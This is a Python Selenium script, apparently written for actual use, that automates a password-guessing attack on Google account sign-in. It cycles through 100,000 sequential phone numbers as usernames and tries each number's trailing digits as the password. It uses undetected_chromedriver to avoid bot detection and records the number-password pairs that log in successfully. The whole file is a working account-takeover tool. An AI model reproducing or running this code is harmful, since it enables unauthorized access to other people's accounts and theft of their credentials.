from time import sleep
from selenium import webdriver
import chromedriver_autoinstaller
from selenium.webdriver.common.by import By
import undetected_chromedriver as uc
from selenium.common.exceptions import WebDriverException
from selenium.webdriver.chrome.options import Options


# with open('Usenumber.txt', 'r') as f:
#     lines = f.read().splitlines()
#     last_line = lines[-1]
#     #print (last_line)
# input_string = int(last_line)
input_string = int(input('Your number Type here : '))
recall = 100000
passcall = int(input('Password digit : '))
input_end = input_string+recall
print("\n")
thislist=[]
i = input_string
while i < input_end:
  i += 1
  thislist.append(i)
thislist1 = ([str(x) for x in thislist])
url = 'https://accounts.google.com/signin/v2/identifier?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Daccount-marketing-page%26utm_medium%3Dgo-to-account-button%26pli%3D1&ec=GAlAwAE&flowName=GlifWebSignIn&flowEntry=AddSession&hl=bn'
chromedriver_autoinstaller.install()
chrome_options = uc.ChromeOptions()
chrome_options.add_argument("--incognito")
driver = uc.Chrome(use_subprocess=True, options=chrome_options)
#driver = uc.Chrome(chromedriver_autoinstaller.install(), use_subprocess=True, options=chrome_options)
chrome_options = Options()
chrome_options.add_experimental_option("detach", True)
if __name__ == '__main__':

    while True:
        for x in thislist1:
            if len(x) >= 2:
                pwds = (x[-passcall:])

            driver.delete_all_cookies()
            driver.get(url)
            # add email

            driver.find_element(By.XPATH, '//*[@id="identifierId"]').send_keys(x)
            driver.implicitly_wait(5000)
            driver.find_element(By.XPATH, '//*[@id="identifierNext"]/div/button/span').click()
            sleep(1.5)
            with open('Usenumber.txt', 'a') as f:
                f.write(x)
                f.write("\n")
            response = driver.current_url
            # url size
            deniedurl = response
            list_deniedurl = list(deniedurl)
            list_deniedurl[341 - 63:] = ''

            str1 = ""
            for i in list_deniedurl:
                str1 += i
            #print(str1)

            # response1 = driver.find_element_by_xpath('//*[@id="headingText"]/span')

            Title = 'https://accounts.google.com/signin/v2/identifier?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Daccount-marketing-page%26utm_medium%3Dgo-to-account-button%26pli%3D1&ec=GAlAwAE&flowName=GlifWebSignIn&flowEntry=AddSession&hl=bn'
            check = 'https://accounts.google.com/signin/v2/deniedsigninrejected?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Daccount-marketing-page%26utm_medium%3Dgo-to-account-button%26pli%3D1&ec=GAlAwAE&flowName=GlifWebSignIn&flowEntry=AddSession&hl=bn&TL='
            if response == Title:
                continue
            elif str1 == check:
                continue


            else:
                sleep(2)
                driver.find_element(By.XPATH, '//*[@id="password"]/div[1]/div/div[1]/input').send_keys(pwds)
                driver.find_element(By.XPATH, '//*[@id="passwordNext"]/div/button/span').click()
                sleep(3)
                response2 = driver.current_url
                #Title2 = "https://accounts.google.com/signin/v2/challenge/pwd?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Daccount-marketing-page%26utm_medium%3Dgo-to-account-button%26pli%3D1&ec=GAlAwAE&flowName=GlifWebSignIn&flowEntry=AddSession&hl=bn&cid=1&navigationDirection=forward&TL=AKqFyY9M7xUbbm4fWIiosSg_x6PGyTHNhQZr_8shvBZOFyC4sOtvQNeMBC3_1oqB"
                # print(response2)
                sleep(.1)
                if response2 == response:
                    continue
                success = driver.current_url
                print(success)

                #succ_url = 'https://accounts.google.com/signin/v2/challenge/ipp?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin&cid=4&navigationDirection=forward&TL=AKqFyY-tq9nBiiIGFD4tHD6W58MXGV6QEjCY81CG0G_-ZdgM-FvSamHiYERj4nIE'
                if success == response2:
                    with open('Validnumber.txt', 'a') as f:
                        f.write(x + ' ' + pwds)
                        f.write("\n")










